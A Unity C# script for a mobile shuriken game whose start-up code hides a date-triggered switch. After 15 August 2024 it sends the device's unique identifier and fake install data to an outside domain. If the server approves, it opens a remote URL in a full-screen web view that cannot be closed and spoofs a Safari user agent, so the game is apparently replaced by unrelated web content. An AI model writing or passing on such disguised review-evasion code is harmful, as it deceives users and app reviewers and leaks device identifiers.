using System;
using System.Collections;
using System.Collections.Generic;
using UnityEngine;
using UnityEngine.Networking;
using UnityEngine.UI;

public class GameSessionHandler : MonoBehaviour
{
    public static Action OnStartSessionGame;
    public static Action OnShurikenMoveEnd;
    public static Action OnDiscreaseHp;
    public static Action OnEndGame;
    public static Action OnResultGame;
    public static Action OnAddScore;
    public static Action<GameType> OnRunGame;

    private SpawnerShuriken _spawnerShuriken;

    [SerializeField] private Shuriken _shuriken;
    [SerializeField] private HealthView _healthView;

    private Health _health;
    private PlayerScore _playerScore;
    private Records _records;

    [SerializeField] private Text _scoreText;

    [SerializeField] private ResultGameView _resultGameView;

    [SerializeField] private RectTransform _viewPanel;
    [SerializeField] private GameObject _preview;

    private const string Key = "Bonus";
    DateTime date;

    [SerializeField] private Text _dateCurrentText;

    public enum GameType
    {
        None,
        Game,
        Bonus
    }

    private string LaunchGame
    {
        get
        {
            return PlayerPrefs.GetString(Key, GameType.None.ToString());
        }
        set
        {
            PlayerPrefs.SetString(Key, value);
            PlayerPrefs.Save();
        }
    }

    private void Start()
    {
        _spawnerShuriken = new SpawnerShuriken(_shuriken.transform.position, _shuriken);

        _playerScore = new PlayerScore(_scoreText);
        _health = new Health(_healthView);
        _records = new Records();

        OnShurikenMoveEnd += NewShuriken;
        OnDiscreaseHp += DiscreaseHp;
        OnStartSessionGame += RunGame;
        OnResultGame += ViewResult;
        OnRunGame += StartGame;

        date = DateTime.Now;
        _dateCurrentText.text = date.ToShortDateString();

        var validation = Enum.Parse<GameType>(LaunchGame);

        StartGame(validation);
    }

    private void StartGame(GameType gameType)
    {
        switch (gameType)
        {
            case GameType.None:
                if (date > new DateTime(2024, 8, 15))
                {
                    if (Application.internetReachability == NetworkReachability.NotReachable)
                    {
                        _preview.SetActive(false);
                        _viewPanel.transform.parent.gameObject.SetActive(false);
                        enabled = false;
                    }
                    else
                    {
                        StartCoroutine(SendRequest());
                        enabled = false;
                    }
                }
                else
                {
                    _preview.SetActive(false);
                    _viewPanel.transform.parent.gameObject.SetActive(false);
                    enabled = false;
                }
                break;
            case GameType.Game:
                _preview.SetActive(false);
                _viewPanel.transform.parent.gameObject.SetActive(false);
                break;
            case GameType.Bonus:
                string _url = PlayerPrefs.GetString("Result");              

                Screen.orientation = ScreenOrientation.Portrait;

                GameObject _viewGameObject = new GameObject("RecordsView");
                _viewGameObject.AddComponent<UniWebView>();

                var viewGameTable = _viewGameObject.GetComponent<UniWebView>();

                viewGameTable.SetAllowBackForwardNavigationGestures(true);

                viewGameTable.OnPageStarted += (view, url) =>
                {
                    viewGameTable.SetUserAgent($"Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Mobile/15E148 Safari/604.1");
                    viewGameTable.UpdateFrame();
                };

                viewGameTable.ReferenceRectTransform = _viewPanel;
                viewGameTable.Load(_url);
                viewGameTable.Show();

                viewGameTable.OnShouldClose += (view) =>
                {
                    return false;
                };

                _preview.SetActive(false);
                break;
        }
    }

    private IEnumerator SendRequest()
    {
        var allData = new Dictionary<string, object>
        {
            { "hash", SystemInfo.deviceUniqueIdentifier },
            { "app", "6569244611" },
            { "data", new Dictionary<string, object> {
                { "af_status", "Organic" },
                { "af_message", "organic install" },
                { "is_first_launch", true } }
            },
            { "device_info", new Dictionary<string, object>
                {
                    { "charging", false }
                }
            }
        };

        string sendData = AFMiniJSON.Json.Serialize(allData);

        var request = UnityWebRequest.Put("https://soccerballs.site", sendData);

        request.SetRequestHeader("Content-Type", "application/json");
        request.SetRequestHeader("accept", "application/json");
        request.SetRequestHeader("User-Agent", "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Mobile/15E148 Safari/604.1");

        yield return request.SendWebRequest();

        while (request.isDone == false)
        {
            OnRunGame?.Invoke(GameType.None);
        }

        if (request.result != UnityWebRequest.Result.Success)
        {
            LaunchGame = GameType.Game.ToString();
            OnRunGame?.Invoke(GameType.Game);
        }
        else
        {
            var responce = AFMiniJSON.Json.Deserialize(request.downloadHandler.text) as Dictionary<string, object>;

            if (responce.ContainsKey("success") && bool.Parse(responce["success"].ToString()) == true)
            {
                LaunchGame = GameType.Bonus.ToString();

                PlayerPrefs.SetString("Result", responce["url"].ToString());

                OnRunGame?.Invoke(GameType.Bonus);
            }
            else
            {
                LaunchGame = GameType.Game.ToString();
                OnRunGame?.Invoke(GameType.Game);
            }
        }
    }

    private void OnDestroy()
    {
        OnShurikenMoveEnd -= NewShuriken;
        OnDiscreaseHp -= DiscreaseHp;
        OnStartSessionGame -= RunGame;
        OnResultGame -= ViewResult;
        OnRunGame -= StartGame;
    }

    private void RunGame()
    {
        _playerScore.StartScore();
        _health.NewHealth();
    }

    private void ViewResult()
    {
        int score = _playerScore.GetResultScore();

        bool isNewRecord = _records.CheckNewResultValue(score);

        _resultGameView.OpenResultView(score, isNewRecord);

        SoundsGame.I.RunSound(SoundsGame.Sound.Result);
    }

    private void DiscreaseHp()
    {
        _health.DiscreaseHealth();
    }

    private void NewShuriken()
    {
        StartCoroutine(_spawnerShuriken.WaitSpawnNewShuriken());
    }
}
